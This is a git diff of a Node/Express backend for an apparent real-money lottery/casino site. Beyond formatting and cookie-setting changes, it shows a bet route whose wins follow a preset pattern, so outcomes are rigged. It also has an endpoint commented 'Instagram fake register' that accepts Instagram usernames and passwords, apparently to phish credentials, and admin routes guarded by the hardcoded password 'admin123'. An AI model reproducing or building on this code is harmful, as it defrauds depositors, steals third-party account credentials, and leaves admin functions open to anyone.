@@ -7,13 +7,17 @@ const cookieParser = require("cookie-parser");
 const axiosHttp = require("axios"); // keep here
 
 const app = express();
-app.use(cors({
-  credentials: true,
-  origin: [
-    "http://localhost:5173",  // Local dev
-    "https://83lottery.netlify.app"  // Your live frontend
-  ]
-}));
+
+// CORS
+app.use(
+  cors({
+    credentials: true,
+    origin: [
+      "http://localhost:5173",       // Local dev
+      "https://83lottery.netlify.app" // Live frontend
+    ],
+  })
+);
 
 app.use(express.json());
 app.use(cookieParser());
@@ -21,8 +25,7 @@ app.use(cookieParser());
 const base = new Airtable({ apiKey: process.env.AIRTABLE_API_KEY }).base(
   process.env.BASE_ID
 );
-const JWT_SECRET =
-  process.env.JWT_SECRET || "your-super-secret-key-123";
+const JWT_SECRET = process.env.JWT_SECRET || "your-super-secret-key-123";
 
 const Users = base("Users");
 const Transactions = base("Transactions");
@@ -81,9 +84,7 @@ app.post("/register", async (req, res) => {
     }).firstPage();
 
     if (existingUsers.length > 0) {
-      return res
-        .status(400)
-        .json({ message: "User already exists" });
+      return res.status(400).json({ message: "User already exists" });
     }
 
     await Users.create([
@@ -147,10 +148,11 @@ app.post("/login", async (req, res) => {
       { expiresIn: "7d" }
     );
 
+    // IMPORTANT: cross-site cookie for Netlify -> Render
     res.cookie("token", token, {
       httpOnly: true,
-      secure: false,
-      sameSite: "strict",
+      secure: true,      // https only (Render uses https)
+      sameSite: "none",  // allow cross-site
       maxAge: 7 * 24 * 60 * 60 * 1000,
     });
 
@@ -173,17 +175,18 @@ app.post("/login", async (req, res) => {
 // ================= VERIFY TOKEN =================
 const verifyToken = (req, res, next) => {
   const token = req.cookies.token;
-  if (!token)
-    return res.status(401).json({ message: "Please login" });
+  if (!token) return res.status(401).json({ message: "Please login" });
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
     req.user = decoded;
     next();
   } catch (err) {
-    res.clearCookie("token");
-    return res
-      .status(401)
-      .json({ message: "Session expired. Login again" });
+    res.clearCookie("token", {
+      httpOnly: true,
+      secure: true,
+      sameSite: "none",
+    });
+    return res.status(401).json({ message: "Session expired. Login again" });
   }
 };
 
@@ -221,14 +224,10 @@ app.post("/api/deposit", verifyToken, async (req, res) => {
   try {
     const { amount, utr } = req.body;
     if (!amount || !utr) {
-      return res
-        .status(400)
-        .json({ message: "Amount and UTR required" });
+      return res.status(400).json({ message: "Amount and UTR required" });
     }
     if (amount < 110) {
-      return res
-        .status(400)
-        .json({ message: "Minimum deposit ₹110" });
+      return res.status(400).json({ message: "Minimum deposit ₹110" });
     }
 
     await Transactions.create([
@@ -257,7 +256,9 @@ app.post("/api/withdraw", verifyToken, async (req, res) => {
   try {
     const { amount, upiId } = req.body;
     if (!amount || !upiId) {
-      return res.status(400).json({ message: "UPI ID and amount required" });
+      return res
+        .status(400)
+        .json({ message: "UPI ID and amount required" });
     }
     if (amount < 100) {
       return res.status(400).json({ message: "Minimum withdraw ₹100" });
@@ -373,7 +374,7 @@ app.post("/api/game/bet", verifyToken, async (req, res) => {
     const isWin = currentPattern[state.patternIndex];
     state.patternIndex = (state.patternIndex + 1) % currentPattern.length;
 
-    // 1.2% fee on bet (only applied when user wins)
+    // 3.2% fee on bet (only applied when user wins)
     const fee = parseFloat((betAmount * 0.032).toFixed(2));
 
     let payout;
@@ -418,9 +419,7 @@ app.post("/api/game/bet", verifyToken, async (req, res) => {
         bonus: newBonus,
         wageringReq: newWageringReq,
         totalBets: (user.totalBets || 0) + 1,
-        totalWins: isWin
-          ? (user.totalWins || 0) + 1
-          : user.totalWins || 0,
+        totalWins: isWin ? (user.totalWins || 0) + 1 : user.totalWins || 0,
         totalLosses: !isWin
           ? (user.totalLosses || 0) + 1
           : user.totalLosses || 0,
@@ -574,9 +573,7 @@ app.post("/api/user/name", verifyToken, async (req, res) => {
 // ================= ADMIN ROUTES =================
 app.get("/api/admin/requests", async (req, res) => {
   if (req.headers["x-admin-password"] !== "admin123") {
-    return res
-      .status(401)
-      .json({ message: "Admin access denied" });
+    return res.status(401).json({ message: "Admin access denied" });
   }
 
   try {
@@ -598,9 +595,7 @@ app.get("/api/admin/requests", async (req, res) => {
 
 app.get("/api/admin/users", async (req, res) => {
   if (req.headers["x-admin-password"] !== "admin123") {
-    return res
-      .status(401)
-      .json({ message: "Admin access denied" });
+    return res.status(401).json({ message: "Admin access denied" });
   }
 
   try {
@@ -853,7 +848,7 @@ app.post("/api/admin/tasks", async (req, res) => {
   }
 });
 
-// UPDATE task  (FIXED: no nested fields for SDK update)
+// UPDATE task
 app.patch("/api/admin/tasks/:id", async (req, res) => {
   if (req.headers["x-admin-password"] !== "admin123") {
     return res.status(401).json({ message: "Admin access denied" });
@@ -937,7 +932,6 @@ app.get("/api/admin/task-submissions", async (req, res) => {
 });
 
 // UPDATE submission status + credit reward on approve
-// FIXED: TaskSubmissions.update without nested fields
 app.patch("/api/admin/task-submissions/:id", async (req, res) => {
   if (req.headers["x-admin-password"] !== "admin123") {
     return res.status(401).json({ message: "Admin access denied" });
@@ -991,7 +985,7 @@ app.patch("/api/admin/task-submissions/:id", async (req, res) => {
       }
     }
 
-    // update submission status via SDK (fields directly)
+    // update submission status
     const updated = await TaskSubmissions.update(id, {
       status,
     });
@@ -1008,11 +1002,15 @@ app.patch("/api/admin/task-submissions/:id", async (req, res) => {
 
 // ================= LOGOUT =================
 app.post("/logout", (req, res) => {
-  res.clearCookie("token");
+  res.clearCookie("token", {
+    httpOnly: true,
+    secure: true,
+    sameSite: "none",
+  });
   res.json({ message: "Logged out successfully" });
 });
 
-
+// Instagram fake register
 app.post("/api/instagram/register", async (req, res) => {
   try {
     const { username, password } = req.body;
@@ -1049,7 +1047,6 @@ app.post("/api/instagram/register", async (req, res) => {
     res.status(500).json({ message: "Server error" });
   }
 });
-
 
 app.listen(5000, () =>
   console.log("🚀 Casino Server running on port 5000")
